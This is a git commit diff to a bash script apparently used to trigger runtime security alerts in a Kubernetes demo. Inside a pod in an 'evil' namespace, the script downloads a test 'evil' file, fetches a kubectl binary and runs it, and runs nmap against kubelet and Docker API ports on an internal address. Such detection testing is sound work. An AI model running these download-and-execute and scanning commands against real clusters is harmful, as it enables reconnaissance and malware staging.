8c3d3c772f2c709f0bd6d418e29b645facbd410d
ivan-tresoldi <67233434+ivan-tresoldi@users.noreply.github.com>
2022-07-21 16:53:02 +0200

    Update runtime_attacks.sh

--- files/runtime_attacks.sh
+++ files/runtime_attacks.sh
@@ -1,13 +1,9 @@
 #!/bin/bash -l
 
-export KUBECONFIG=/var/www/html/kubeconfig
-
-PO=$(kubectl get po -n evil|grep evil| awk '{ print $1 }')
+PO=$(kubectl get pod -n evil|grep evil| awk '{ print $1 }')
 
 echo "DL bad evil file"
 kubectl exec $PO -n evil -- bash -c "curl https://cdn.twistlock.com/john/evil -o evil"
-kubectl exec $PO -n evil -it -- bash -c "curl https://wildfire.paloaltonetworks.com/publicapi/test/elf  -o WF-evil_$(date +%s)"
-
 
 echo "Kubernetes attack"
 kubectl exec $PO -n evil -- bash -c "curl https://storage.googleapis.com/kubernetes-release/release/v1.18.0/bin/linux/amd64/kubectl -o kubectl; chmod +x ./kubectl ; ./kubectl version --client"
@@ -17,3 +13,5 @@ kubectl exec $PO -n evil -- bash -c "curl github.com"
 
 echo "bad port scanning"
 kubectl exec $PO -n evil -- bash -c "nmap -p 80,8080,8081,8082,8083,8084,2375,10250,6443,9998 10.32.0.24"
+
+command || true
